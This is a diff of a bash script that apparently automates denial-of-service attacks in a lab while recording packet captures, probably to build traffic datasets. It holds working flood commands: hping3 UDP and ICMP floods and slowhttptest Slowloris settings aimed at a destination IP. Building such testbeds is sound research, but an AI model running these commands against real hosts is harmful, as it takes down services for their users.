@@ -22,7 +22,7 @@ mul_attack(){
     echo "Started $1 attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
     #Run the attack
-    ./mul_attack.sh $1 $2 $3 $4 $5 $6 $7 $8 "$9" "$10"
+    ./mul_attacks.sh $1 $2 $3 $4 $5 $6 "$7" "$8"
 
     #Write to file
     echo "$1 attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
@@ -254,7 +254,6 @@ kill $pid_tshark
 echo "Break 9 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
 
-
 #Define variables for combined attack 1
 attack_type="UDPandSlowLoris"
 capture_file="/home/wiresharkTraces/UDPandSlowLoris.pcap"
@@ -267,7 +266,7 @@ destination_port=$machine13_port
 attack_script1="hping3 --flood --udp -p $destination_port $destination_ip"
 attack_script2="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http://$destination_ip -x 24 -p 3"
 
-mul_attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script1" "$attack_script2"
+mul_attack $attack_type $capture_file $traceroute_log  $attack_log $attack_duration $destination_ip "$attack_script1" "$attack_script2"
 
 
 #Write to file
@@ -295,4 +294,4 @@ destination_port=$machine13_port
 attack_script1="hping3 --flood -1 $destination_ip"
 attack_script2="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http://$destination_ip -x 10 -p 3"
 
-mul_attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script1" "$attack_script2"
+mul_attack $attack_type $capture_file $traceroute_log  $attack_log $attack_duration $destination_ip  "$attack_script1" "$attack_script2"
